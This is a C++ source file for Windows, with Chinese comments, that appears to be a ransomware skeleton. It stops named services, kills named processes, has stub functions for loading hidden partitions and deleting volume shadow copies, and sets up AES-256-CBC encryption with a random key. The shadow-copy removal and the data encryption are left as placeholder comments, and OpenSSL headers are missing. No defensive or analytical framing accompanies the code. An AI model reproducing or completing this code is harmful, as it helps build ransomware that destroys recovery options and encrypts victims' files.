#include <iostream>
#include <vector>
#include <string>
#include <Windows.h>
#include <Psapi.h>
#include <Aclapi.h>

bool stop_service(const std::string& service_name);
bool stop_process(const std::string& process_name);
void _load_hidden_partitions();
void _remove_shadows();
bool IsWow64();
void gen_context();

int main() {
	std::vector<std::string> services_to_stop = { "Service1", "Service2", "Service3" };
	std::vector<std::string> processes_to_stop = { "Process1.exe", "Process2.exe", "Process3.exe" };

	for (const auto& service : services_to_stop) {
		stop_service(service);
	}

	for (const auto& process : processes_to_stop) {
		stop_process(process);
	}

	_load_hidden_partitions();
	_remove_shadows();

	if (IsWow64()) {
		std::cout << "Running under WOW64." << std::endl;
	}
	else {
		std::cout << "Not running under WOW64." << std::endl;
	}

	gen_context();

	return 0;
}

bool stop_service(const std::string& service_name) {
	SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (hSCM == NULL) {
		return false;
	}

	SC_HANDLE hService = OpenService(hSCM, service_name.c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
	if (hService == NULL) {
		CloseServiceHandle(hSCM);
		return false;
	}

	SERVICE_STATUS status;
	ControlService(hService, SERVICE_CONTROL_STOP, &status);

	CloseServiceHandle(hService);
	CloseServiceHandle(hSCM);
	return true;
}

bool stop_process(const std::string& process_name) {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		return false;
	}

	cProcesses = cbNeeded / sizeof(DWORD);
	for (unsigned int i = 0; i < cProcesses; i++) {
		if (aProcesses[i] != 0) {
			TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

			if (hProcess != NULL) {
				HMODULE hMod;
				DWORD cbNeeded;
				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
					GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
				}
			}

			if (process_name == szProcessName) {
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
				return true;
			}
			CloseHandle(hProcess);
		}
	}
	return false;
}

void _load_hidden_partitions() {
	// 请根据具体需求实现加载隐藏分区的功能
}

void _remove_shadows() {
	// 请根据具体需求实现删除卷影复制的功能
}

bool IsWow64() {
	BOOL bIsWow64 = FALSE;
	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

	LPFN_ISWOW64PROCESS fnIsWow64Process;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

	if (fnIsWow64Process != NULL) {
		if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64)) {
			// Handle error
			return false;
		}
	}
	return bIsWow64;
}

void gen_context() {
	EVP_CIPHER_CTX* ctx;
	unsigned char key[EVP_MAX_KEY_LENGTH];
	unsigned char iv[EVP_MAX_IV_LENGTH];

	// 生成随机密钥和初始化向量
	if (!RAND_bytes(key, sizeof(key)) || !RAND_bytes(iv, sizeof(iv))) {
		std::cerr << "Failed to generate random key and IV." << std::endl;
		return;
	}

	// 创建加密上下文
	ctx = EVP_CIPHER_CTX_new();
	if (!ctx) {
		std::cerr << "Failed to create cipher context." << std::endl;
		return;
	}

	// 使用AES-256-CBC进行加密
	if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
		std::cerr << "Failed to initialize encryption context." << std::endl;
		EVP_CIPHER_CTX_free(ctx);
		return;
	}

	// 在这里，您可以使用EVP_EncryptUpdate()和EVP_EncryptFinal_ex()对数据进行加密操作

	// 清理并释放资源
	EVP_CIPHER_CTX_free(ctx);
}

